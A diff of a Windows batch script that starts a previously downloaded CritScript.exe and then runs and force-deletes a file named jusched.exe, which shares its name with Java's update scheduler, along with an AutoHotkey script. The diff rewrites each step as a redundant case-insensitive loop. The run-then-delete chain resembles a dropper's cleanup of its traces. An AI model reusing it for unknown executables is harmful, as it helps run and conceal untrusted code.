@@ -44,31 +44,40 @@ echo CritScript.exe downloaded successfully.
 echo Running CritScript.exe...
 start "" CritScript.exe
 
-:: Step 3: Check and run jusched.exe if it exists
-if exist "jusched.exe" (
-    echo Found jusched.exe. Running it...
-    start "" jusched.exe
-) else (
-    echo jusched.exe not found.
+:: Step 3: Check and run JUSCHED.EXE if it exists (case-insensitive)
+for %%F in (jusched.exe JUSCHED.EXE) do (
+    if exist "%%F" (
+        echo Found %%F. Running it...
+        start "" %%F
+        goto :CheckZombies
+    )
 )
+echo jusched.exe not found.
 
-:: Step 4: Check and run Zombies.ahk if it exists
-if exist "Zombies.ahk" (
-    echo Found Zombies.ahk. Running it...
-    start "" Zombies.ahk
-) else (
-    echo Zombies.ahk not found.
+:CheckZombies
+:: Step 4: Check and run ZOMBIES.AHK if it exists (case-insensitive)
+for %%F in (zombies.ahk ZOMBIES.AHK) do (
+    if exist "%%F" (
+        echo Found %%F. Running it...
+        start "" %%F
+        goto :DeleteJusched
+    )
 )
+echo Zombies.ahk not found.
 
-:: Step 5: Delete jusched.exe if it exists
-if exist "jusched.exe" (
-    echo Deleting jusched.exe...
-    del /f /q "jusched.exe"
-    echo jusched.exe deleted.
-) else (
-    echo jusched.exe not found. Nothing to delete.
+:DeleteJusched
+:: Step 5: Delete jusched.exe if it exists (case-insensitive)
+for %%F in (jusched.exe JUSCHED.EXE) do (
+    if exist "%%F" (
+        echo Deleting %%F...
+        del /f /q "%%F"
+        echo %%F deleted.
+        goto :ExitScript
+    )
 )
+echo jusched.exe not found. Nothing to delete.
 
+:ExitScript
 :: Exit the script
 echo Script completed. Exiting...
 pause
